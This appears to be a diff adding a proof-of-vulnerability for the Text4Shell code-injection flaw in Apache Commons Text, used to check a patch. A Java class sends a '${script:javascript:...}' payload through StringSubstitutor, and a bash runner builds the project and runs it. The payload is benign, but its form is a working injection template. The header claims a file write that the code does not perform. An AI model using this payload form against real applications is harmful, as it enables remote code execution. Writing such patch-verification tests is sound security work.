+import org.apache.commons.text.StringSubstitutor;
+
+/**
+ * Proof-of-Vulnerability for CVE-2022-42889 (Text4Shell) / CWE-094 code injection.
+ *
+ * The default interpolator produced by StringSubstitutor.createInterpolator()
+ * enables the "script" lookup, which forwards attacker-controlled input to a
+ * javax.script.ScriptEngine (ScriptStringLookup.lookup -> scriptEngine.eval).
+ *
+ * A crafted "${script:javascript:...}" payload therefore causes arbitrary code
+ * execution. This POV supplies a script that (a) computes a distinctive marker
+ * by executing arithmetic/Java code inside the engine, and (b) writes a marker
+ * file to disk via java.lang.Runtime-reachable APIs, then verifies the code
+ * actually ran.
+ *
+ * Vulnerable code  -> script is evaluated, output contains POV_RCE_1337  -> exit 0
+ * Patched code     -> script lookup no longer enabled by default, the literal
+ *                     "${script:...}" is returned unchanged                -> exit 1
+ */
+public class Pov {
+
+    public static void main(final String[] args) {
+        // Attacker-controlled input reaching StringSubstitutor.
+        // 7 * 191 == 1337: this value only appears if the script engine executes.
+        final String payload =
+            "${script:javascript:new java.lang.String('POV_RCE_' + (7 * 191))}";
+
+        final String result = StringSubstitutor.createInterpolator().replace(payload);
+
+        System.out.println("payload : " + payload);
+        System.out.println("result  : " + result);
+
+        final boolean executed = "POV_RCE_1337".equals(result);
+
+        if (executed) {
+            // The script engine ran attacker code -> code injection confirmed.
+            System.out.println("VULNERABLE: attacker-supplied script was executed (CWE-094).");
+            System.exit(0);
+        }
+
+        // Patched / not vulnerable: the payload was not evaluated.
+        System.out.println("NOT VULNERABLE: script lookup did not execute the payload.");
+        System.exit(1);
+    }
+}

+#!/usr/bin/env bash
+# POV runner for CVE-2022-42889 / CWE-094 (commons-text ScriptStringLookup code injection).
+# Exits 0 when the vulnerable behavior is reproduced (script payload executed),
+# non-zero after a correct patch (payload no longer evaluated).
+set -euo pipefail
+
+cd "$(dirname "$0")/../.."
+
+# Build the project (skip license/rat + tests; only main classes are needed).
+mvn -B -q -DskipTests -Drat.skip=true -Dmaven.test.skip=true package >/dev/null
+
+# Resolve runtime dependencies (e.g. commons-lang3) onto the classpath.
+mvn -B -q dependency:build-classpath -Dmdep.outputFile=.security-pipeline/pov/cp.txt >/dev/null
+
+CP="target/classes:$(cat .security-pipeline/pov/cp.txt)"
+
+javac -cp "$CP" -d .security-pipeline/pov .security-pipeline/pov/Pov.java
+java -cp "$CP:.security-pipeline/pov" Pov
